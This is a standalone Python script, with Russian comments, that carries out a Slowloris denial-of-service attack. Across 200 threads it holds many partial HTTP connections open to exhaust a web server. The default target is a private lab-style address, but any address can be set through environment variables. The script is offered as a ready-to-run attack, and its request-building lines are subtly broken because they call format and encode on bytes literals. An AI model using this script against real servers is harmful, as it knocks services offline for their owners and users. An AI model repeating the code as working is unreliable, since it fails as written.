#!/usr/bin/env python3

import socket
import threading
import time
import random
import os

TARGET_IP = os.getenv('TARGET_IP', '192.168.56.10')
TARGET_PORT = int(os.getenv('TARGET_PORT', '8080'))
THREADS = int(os.getenv('THREADS', '200'))

class SlowlorisAttack:
    def __init__(self, target_ip, target_port, threads=200):
        self.target_ip = target_ip
        self.target_port = target_port
        self.threads = threads
        self.sockets = []
        
    def create_socket(self):
        """Создание сокета и начальный запрос"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(4)
            sock.connect((self.target_ip, self.target_port))
            
            # Отправляем неполный HTTP запрос
            sock.send(b"GET /?{} HTTP/1.1\r\n".format(random.randint(0, 2000)).encode())
            sock.send(b"User-Agent: Mozilla/5.0\r\n".encode())
            sock.send(b"Accept-language: en-US,en,q=0.5\r\n".encode())
            
            return sock
        except socket.error:
            return None
    
    def slowloris_worker(self):
        """Рабочий поток для Slowloris атаки"""
        sockets = []
        
        # Создаем начальные соединения
        for _ in range(50):
            sock = self.create_socket()
            if sock:
                sockets.append(sock)
        
        print(f"Thread started with {len(sockets)} connections")
        
        while True:
            # Отправляем дополнительные заголовки для поддержания соединения
            for sock in sockets[:]:
                try:
                    sock.send(b"X-a: {}\r\n".format(random.randint(1, 5000)).encode())
                except socket.error:
                    sockets.remove(sock)
            
            # Добавляем новые соединения если некоторые закрылись
            while len(sockets) < 50:
                sock = self.create_socket()
                if sock:
                    sockets.append(sock)
            
            print(f"Active connections: {len(sockets)}")
            time.sleep(15)  # Ждем 15 секунд перед следующей итерацией
    
    def start_attack(self):
        """Запуск атаки"""
        print(f"Starting Slowloris attack against {self.target_ip}:{self.target_port}")
        print(f"Using {self.threads} threads")
        
        threads = []
        for i in range(self.threads):
            thread = threading.Thread(target=self.slowloris_worker)
            thread.daemon = True
            thread.start()
            threads.append(thread)
        
        # Основной цикл
        try:
            while True:
                time.sleep(1)
        except KeyboardInterrupt:
            print("Attack stopped")

if __name__ == "__main__":
    attack = SlowlorisAttack(TARGET_IP, TARGET_PORT, THREADS)
    attack.start_attack() 